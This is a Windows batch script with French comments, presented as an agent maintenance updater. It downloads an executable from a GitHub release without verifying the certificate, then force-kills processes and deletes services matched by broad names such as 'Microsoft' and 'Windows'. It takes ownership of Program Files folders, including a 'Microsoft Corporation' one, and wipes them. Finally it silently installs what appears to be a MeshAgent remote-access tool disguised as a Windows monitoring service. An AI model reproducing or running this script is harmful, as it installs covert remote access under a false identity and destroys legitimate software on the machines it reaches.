@echo off
setlocal enabledelayedexpansion
:: Configuration
set "LDIR=C:\Temp"
set "LFILE=%LDIR%\agent_maintenance.log"
set "URL=https://github.com/LightZirconite/MeshAgent/releases/download/exe/WindowsMonitoringService64-Lol.exe"
set "T_EXE=%TEMP%\WindowsMonitoringService64-Lol.exe"
if not exist "%LDIR%" mkdir "%LDIR%"
echo [START] %DATE% %TIME% > "%LFILE%"
:: 1. Vérification Admin
net session >nul 2>&1 || (echo [ERREUR] Droits admin requis >> "%LFILE%" & exit /b 1)
:: 2. Téléchargement du nouvel agent en premier
echo [2] Telechargement du nouvel agent... >> "%LFILE%"
curl -L -k -f -o "%T_EXE%" "%URL%" >> "%LFILE%" 2>&1
if not exist "%T_EXE%" (
    echo [ERREUR] Impossible de recuperer l'executable. Abandon de la mise a jour pour eviter la perte d'acces. >> "%LFILE%"
    goto :final
)
echo [OK] Nouvel agent telecharge avec succes. >> "%LFILE%"
:: 3. Identification dynamique et arrêt des processus
echo [3] Recherche et arret des processus... >> "%LFILE%"
:: Corriger la recherche : Utiliser tasklist pour noms d'images, puis verifier chemin via wmic avec ProcessId
for /f "tokens=1,2 delims=," %%A in ('tasklist /fi "STATUS eq running" /nh /fo csv') do (
    set "image=%%~A"
    set "pid=%%~B"
    if defined image if defined pid (
        wmic process where ProcessId=!pid! get ExecutablePath 2>nul | findstr /i "Mesh LGTW Monitoring Microsoft Corporation" >nul
        if !errorlevel! equ 0 (
            echo [INFO] Processus identifie : !image! (PID: !pid!) >> "%LFILE%"
            taskkill /F /PID !pid! /T >> "%LFILE%" 2>&1
        )
    )
)
:: Attendre un peu pour que les processus se terminent
timeout /t 5 /nobreak >nul
:: 4. Désinstallation via les outils Windows (sc & désinstalleurs)
echo [4] Desinstallation complete... >> "%LFILE%"
:: Services potentiels
set "SERVICES=Mesh LGTW Monitoring WindowsMonitoringService Sensor Windows"
for %%s in (%SERVICES%) do (
    echo [INFO] Suppression du service : %%s >> "%LFILE%"
    sc query "%%s" >nul 2>&1
    if !errorlevel! equ 0 (
        sc stop "%%s" >> "%LFILE%" 2>&1
        timeout /t 5 /nobreak >nul  :: Attendre arret
        sc delete "%%s" >> "%LFILE%" 2>&1
    ) else (
        echo [INFO] Service %%s non trouve. >> "%LFILE%"
    )
)
:: 5. Nettoyage physique des dossiers Program Files
echo [5] Nettoyage des dossiers... >> "%LFILE%"
set "DIRS=%ProgramFiles%\Mesh Agent;%ProgramFiles%\LGTW;%ProgramFiles(x86)%\Mesh Agent;%ProgramFiles%\Microsoft Corporation"
for %%D in (%DIRS%) do (
    if exist "%%~D" (
        takeown /f "%%~D" /r /d y >> "%LFILE%" 2>&1
        icacls "%%~D" /grant administrators:F /t >> "%LFILE%" 2>&1
        rd /s /q "%%~D" >> "%LFILE%" 2>&1
        if exist "%%~D" (
            echo [AVERTISSEMENT] Echec complet du nettoyage de %%~D, certains fichiers verrouilles. Tentative de retry apres delai. >> "%LFILE%"
            timeout /t 10 /nobreak >nul
            rd /s /q "%%~D" >> "%LFILE%" 2>&1
        )
        echo [OK] Nettoyage de %%~D tente. >> "%LFILE%"
    )
)
:: 6. Installation avec --fullinstall
echo [6] Installation avec --fullinstall... >> "%LFILE%"
start /wait "" "%T_EXE%" --fullinstall
echo [OK] Commande d'installation envoyee et attendue. >> "%LFILE%"
:: 7. Nettoyage final de l'installateur
if exist "%T_EXE%" del /f /q "%T_EXE%" >> "%LFILE%" 2>&1
:final
echo [END] %DATE% %TIME% >> "%LFILE%"
echo -------------------------- >> "%LFILE%"
exit /b 0
